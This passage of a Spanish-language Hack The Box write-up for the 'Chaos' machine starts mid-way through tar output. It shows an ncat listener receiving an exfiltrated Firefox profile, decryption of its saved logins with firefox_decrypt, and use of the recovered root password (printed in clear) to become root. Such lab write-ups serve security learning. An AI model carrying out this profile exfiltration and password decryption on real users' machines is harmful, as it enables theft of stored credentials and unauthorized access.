./.mozilla/firefox/bzo7sjt1.default/sessionstore-backups/
tar: ./.mozilla/firefox/bzo7sjt1.default/sessionstore-backups/recovery.js: Cannot open: Permission denied
tar: ./.mozilla/firefox/bzo7sjt1.default/sessionstore-backups/upgrade.js-20180326230345: Cannot open: Permission denied
tar: ./.mozilla/firefox/bzo7sjt1.default/sessionstore-backups/previous.js: Cannot open: Permission denied
tar: ./.mozilla/firefox/bzo7sjt1.default/sessionstore-backups/recovery.bak: Cannot open: Permission denied
./.mozilla/firefox/bzo7sjt1.default/bookmarkbackups/
tar: ./.mozilla/firefox/bzo7sjt1.default/bookmarkbackups/bookmarks-2018-09-29_23_KNEJR-waZJZwUVshUNhFqg==.jsonlz4: Cannot open: Permission denied
tar: ./.mozilla/firefox/bzo7sjt1.default/bookmarkbackups/bookmarks-2018-10-27_24_0UTpOFh1V6tsL2fi6cyvng==.jsonlz4: Cannot open: Permission denied
./.mozilla/firefox/bzo7sjt1.default/cookies.sqlite-wal
./.mozilla/firefox/bzo7sjt1.default/formhistory.sqlite
./.mozilla/firefox/bzo7sjt1.default/webappsstore.sqlite-shm
./.mozilla/firefox/bzo7sjt1.default/storage.sqlite
./.mozilla/firefox/bzo7sjt1.default/cert_override.txt
./.mozilla/firefox/bzo7sjt1.default/gmp/
tar: ./.mozilla/firefox/bzo7sjt1.default/gmp/Linux_x86_64-gcc3: Cannot open: Permission denied
./.mozilla/firefox/bzo7sjt1.default/blocklist.xml
./.mozilla/firefox/bzo7sjt1.default/cookies.sqlite-shm
./.mozilla/firefox/bzo7sjt1.default/search.json.mozlz4
./.mozilla/firefox/bzo7sjt1.default/AlternateServices.txt
./.mozilla/firefox/bzo7sjt1.default/content-prefs.sqlite
./.mozilla/firefox/bzo7sjt1.default/cert9.db
./.mozilla/firefox/bzo7sjt1.default/storage/
./.mozilla/firefox/bzo7sjt1.default/storage/temporary/
./.mozilla/firefox/bzo7sjt1.default/storage/default/
./.mozilla/firefox/bzo7sjt1.default/storage/default/https+++www.google.com/
./.mozilla/firefox/bzo7sjt1.default/storage/default/https+++www.google.com/.metadata-v2
./.mozilla/firefox/bzo7sjt1.default/storage/default/https+++www.google.com/idb/
./.mozilla/firefox/bzo7sjt1.default/storage/default/https+++www.google.com/idb/548905059db.sqlite
./.mozilla/firefox/bzo7sjt1.default/storage/default/https+++www.google.com/idb/548905059db.files/
./.mozilla/firefox/bzo7sjt1.default/storage/default/https+++www.google.com/.metadata
./.mozilla/firefox/bzo7sjt1.default/storage/permanent/
./.mozilla/firefox/bzo7sjt1.default/storage/permanent/chrome/
./.mozilla/firefox/bzo7sjt1.default/storage/permanent/chrome/.metadata-v2
./.mozilla/firefox/bzo7sjt1.default/storage/permanent/chrome/idb/
./.mozilla/firefox/bzo7sjt1.default/storage/permanent/chrome/idb/2918063365piupsah.sqlite
./.mozilla/firefox/bzo7sjt1.default/storage/permanent/chrome/idb/2918063365piupsah.files/
./.mozilla/firefox/bzo7sjt1.default/storage/permanent/chrome/.metadata
./.mozilla/firefox/bzo7sjt1.default/datareporting/
tar: ./.mozilla/firefox/bzo7sjt1.default/datareporting/session-state.json: Cannot open: Permission denied
tar: ./.mozilla/firefox/bzo7sjt1.default/datareporting/state.json: Cannot open: Permission denied
tar: ./.mozilla/firefox/bzo7sjt1.default/datareporting/archived: Cannot open: Permission denied
tar: ./.mozilla/firefox/bzo7sjt1.default/datareporting/aborted-session-ping: Cannot open: Permission denied
./.mozilla/firefox/bzo7sjt1.default/pkcs11.txt
./.mozilla/firefox/bzo7sjt1.default/logins.json
./.mozilla/firefox/bzo7sjt1.default/extensions.ini
./.mozilla/firefox/bzo7sjt1.default/compatibility.ini
./.mozilla/firefox/bzo7sjt1.default/minidumps/
./.mozilla/firefox/bzo7sjt1.default/blocklist-gfx.json
./.mozilla/firefox/bzo7sjt1.default/.parentlock
./.mozilla/firefox/bzo7sjt1.default/sessionCheckpoints.json
./.mozilla/firefox/bzo7sjt1.default/prefs.js
./.mozilla/firefox/bzo7sjt1.default/addons.json
./.mozilla/firefox/bzo7sjt1.default/xulstore.json
./.mozilla/firefox/bzo7sjt1.default/revocations.txt
./.mozilla/firefox/bzo7sjt1.default/extensions.json
./.mozilla/firefox/bzo7sjt1.default/places.sqlite-shm
./.mozilla/firefox/bzo7sjt1.default/key4.db
./.mozilla/firefox/bzo7sjt1.default/crashes/
tar: ./.mozilla/firefox/bzo7sjt1.default/crashes/events: Cannot open: Permission denied
tar: ./.mozilla/firefox/bzo7sjt1.default/crashes/store.json.mozlz4: Cannot open: Permission denied
./.mozilla/firefox/bzo7sjt1.default/pluginreg.dat
./.mozilla/firefox/bzo7sjt1.default/places.sqlite-wal
./.mozilla/firefox/bzo7sjt1.default/webappsstore.sqlite-wal
./.mozilla/firefox/bzo7sjt1.default/blocklist-plugins.json
./.mozilla/firefox/bzo7sjt1.default/kinto.sqlite
./.mozilla/firefox/bzo7sjt1.default/times.json
./.mozilla/firefox/bzo7sjt1.default/saved-telemetry-pings/
tar: ./.mozilla/firefox/bzo7sjt1.default/saved-telemetry-pings/f153dbe5-b2e1-46ad-bb38-d0d2e22ab3fe: Cannot open: Permission denied
tar: ./.mozilla/firefox/bzo7sjt1.default/saved-telemetry-pings/dc2f3e22-3710-4da9-9d30-c01f0885a480: Cannot open: Permission denied
tar: ./.mozilla/firefox/bzo7sjt1.default/saved-telemetry-pings/b35e9f24-a4a9-4683-b4ec-1fdaf3533a7a: Cannot open: Permission denied
./.mozilla/firefox/bzo7sjt1.default/mimeTypes.rdf
./.mozilla/firefox/bzo7sjt1.default/containers.json
./.mozilla/firefox/bzo7sjt1.default/SecurityPreloadState.txt
./.mozilla/firefox/bzo7sjt1.default/SiteSecurityServiceState.txt
./.mozilla/firefox/bzo7sjt1.default/blocklist-addons.json
tar: Exiting with failure status due to previous errors
ayush@chaos:~$
```

A pesar de los problemas de permisos, ya el material importante del profile esta fuera.

Antes de ejecutar el comando anterior, ejecute lo mio en el listener:

```text
xbytemx@laptop:~/htb/chaos$ mkdir firefox
xbytemx@laptop:~/htb/chaos$ cd firefox/
xbytemx@laptop:~/htb/chaos/firefox$ ncat -l -p 4001 | tar xvz
./.mozilla/firefox/bzo7sjt1.default/
./.mozilla/firefox/bzo7sjt1.default/cookies.sqlite
./.mozilla/firefox/bzo7sjt1.default/places.sqlite
./.mozilla/firefox/bzo7sjt1.default/webappsstore.sqlite
./.mozilla/firefox/bzo7sjt1.default/permissions.sqlite
./.mozilla/firefox/bzo7sjt1.default/sessionstore-backups/
./.mozilla/firefox/bzo7sjt1.default/bookmarkbackups/
./.mozilla/firefox/bzo7sjt1.default/cookies.sqlite-wal
./.mozilla/firefox/bzo7sjt1.default/formhistory.sqlite
./.mozilla/firefox/bzo7sjt1.default/webappsstore.sqlite-shm
./.mozilla/firefox/bzo7sjt1.default/storage.sqlite
./.mozilla/firefox/bzo7sjt1.default/cert_override.txt
./.mozilla/firefox/bzo7sjt1.default/gmp/
./.mozilla/firefox/bzo7sjt1.default/blocklist.xml
./.mozilla/firefox/bzo7sjt1.default/cookies.sqlite-shm
./.mozilla/firefox/bzo7sjt1.default/search.json.mozlz4
./.mozilla/firefox/bzo7sjt1.default/AlternateServices.txt
./.mozilla/firefox/bzo7sjt1.default/content-prefs.sqlite
./.mozilla/firefox/bzo7sjt1.default/cert9.db
./.mozilla/firefox/bzo7sjt1.default/storage/
./.mozilla/firefox/bzo7sjt1.default/storage/temporary/
./.mozilla/firefox/bzo7sjt1.default/storage/default/
./.mozilla/firefox/bzo7sjt1.default/storage/default/https+++www.google.com/
./.mozilla/firefox/bzo7sjt1.default/storage/default/https+++www.google.com/.metadata-v2
./.mozilla/firefox/bzo7sjt1.default/storage/default/https+++www.google.com/idb/
./.mozilla/firefox/bzo7sjt1.default/storage/default/https+++www.google.com/idb/548905059db.sqlite
./.mozilla/firefox/bzo7sjt1.default/storage/default/https+++www.google.com/idb/548905059db.files/
./.mozilla/firefox/bzo7sjt1.default/storage/default/https+++www.google.com/.metadata
./.mozilla/firefox/bzo7sjt1.default/storage/permanent/
./.mozilla/firefox/bzo7sjt1.default/storage/permanent/chrome/
./.mozilla/firefox/bzo7sjt1.default/storage/permanent/chrome/.metadata-v2
./.mozilla/firefox/bzo7sjt1.default/storage/permanent/chrome/idb/
./.mozilla/firefox/bzo7sjt1.default/storage/permanent/chrome/idb/2918063365piupsah.sqlite
./.mozilla/firefox/bzo7sjt1.default/storage/permanent/chrome/idb/2918063365piupsah.files/
./.mozilla/firefox/bzo7sjt1.default/storage/permanent/chrome/.metadata
./.mozilla/firefox/bzo7sjt1.default/datareporting/
./.mozilla/firefox/bzo7sjt1.default/pkcs11.txt
./.mozilla/firefox/bzo7sjt1.default/logins.json
./.mozilla/firefox/bzo7sjt1.default/extensions.ini
./.mozilla/firefox/bzo7sjt1.default/compatibility.ini
./.mozilla/firefox/bzo7sjt1.default/minidumps/
./.mozilla/firefox/bzo7sjt1.default/blocklist-gfx.json
./.mozilla/firefox/bzo7sjt1.default/.parentlock
./.mozilla/firefox/bzo7sjt1.default/sessionCheckpoints.json
./.mozilla/firefox/bzo7sjt1.default/prefs.js
./.mozilla/firefox/bzo7sjt1.default/addons.json
./.mozilla/firefox/bzo7sjt1.default/xulstore.json
./.mozilla/firefox/bzo7sjt1.default/revocations.txt
./.mozilla/firefox/bzo7sjt1.default/extensions.json
./.mozilla/firefox/bzo7sjt1.default/places.sqlite-shm
./.mozilla/firefox/bzo7sjt1.default/key4.db
./.mozilla/firefox/bzo7sjt1.default/crashes/
./.mozilla/firefox/bzo7sjt1.default/pluginreg.dat
./.mozilla/firefox/bzo7sjt1.default/places.sqlite-wal
./.mozilla/firefox/bzo7sjt1.default/webappsstore.sqlite-wal
./.mozilla/firefox/bzo7sjt1.default/blocklist-plugins.json
./.mozilla/firefox/bzo7sjt1.default/kinto.sqlite
./.mozilla/firefox/bzo7sjt1.default/times.json
./.mozilla/firefox/bzo7sjt1.default/saved-telemetry-pings/
./.mozilla/firefox/bzo7sjt1.default/mimeTypes.rdf
./.mozilla/firefox/bzo7sjt1.default/containers.json
./.mozilla/firefox/bzo7sjt1.default/SecurityPreloadState.txt
./.mozilla/firefox/bzo7sjt1.default/SiteSecurityServiceState.txt
./.mozilla/firefox/bzo7sjt1.default/blocklist-addons.json
xbytemx@laptop:~/htb/chaos/firefox$
```

Esta información fue un poco como plana, tenemos en general cosas del sitio www.google.com, hasta que me percate que también teníamos un registro de chaos.htb:

```text
xbytemx@laptop:~/htb/chaos/firefox/.mozilla/firefox/bzo7sjt1.default$ find . -type f -exec grep 'chaos.htb' {} \;
chaos.htb:10000	OID.2.16.840.1.101.3.4.2.1	C3:99:F8:77:6B:9F:0E:54:D4:29:FC:99:1D:1E:AB:C6:4E:2D:80:41:08:37:5E:B5:3B:87:BA:44:80:2C:88:CE	MU	AAAAAAAAAAAAAAAJAAAATQDbHfGdsjNmrTBLMSIwIAYDVQQKDBlXZWJtaW4gV2Vic2VydmVyIG9uIGNoYW9zMQowCAYDVQQDDAEqMRkwFwYJKoZIhvcNAQkBFgpyb290QGNoYW9z
Coincidencia en el fichero binario ./places.sqlite
{"nextId":3,"logins":[{"id":2,"hostname":"https://chaos.htb:10000","httpRealm":null,"formSubmitURL":"https://chaos.htb:10000","usernameField":"user","passwordField":"pass","encryptedUsername":"MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECDSAazrlUMZFBAhbsMDAlL9iaw==","encryptedPassword":"MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECNx7bW1TuuCuBBAP8YwnxCZH0+pLo6cJJxnb","guid":"{cb6cd202-0ff8-4de5-85df-e0b8a0f18778}","encType":1,"timeCreated":1540642202692,"timeLastUsed":1540642202692,"timePasswordChanged":1540642202692,"timesUsed":1}],"disabledHosts":[],"version":2}
```

Como podemos ver se trata de una contraseña para el sitio webmin al que no pudimos acceder antes. Para descifrar la contraseña necesitamos utilizar otra herramienta, la cual encontramos en github:

```text
xbytemx@laptop:~/git/firefox_decrypt$ python firefox_decrypt.py /home/xbytemx/htb/chaos/firefox/.mozilla/firefox/bzo7sjt1.default/
2019-04-27 02:38:12,107 - WARNING - profile.ini not found in /home/xbytemx/htb/chaos/firefox/.mozilla/firefox/bzo7sjt1.default/
2019-04-27 02:38:12,107 - WARNING - Continuing and assuming '/home/xbytemx/htb/chaos/firefox/.mozilla/firefox/bzo7sjt1.default/' is a profile location

Master Password for profile /home/xbytemx/htb/chaos/firefox/.mozilla/firefox/bzo7sjt1.default/:

Website:   https://chaos.htb:10000
Username: 'root'
Password: 'Thiv8wrej~'
xbytemx@laptop:~/git/firefox_decrypt$
```

Llegar hasta aquí para regresar a una aplicación no parecía lo mas obvio después de identificar las credenciales de _ayush_ como user de app y sistema operativo, así que probé las credenciales de root:

```text
ayush@chaos:~$ su - root
su - root
Password: Thiv8wrej~

root@chaos:~#
```

Y... somos root.

# cat root.txt

```text
root@chaos:~# cat root.txt
```

... We got root and user flag.

---

Gracias por llegar hasta aquí, hasta la próxima!
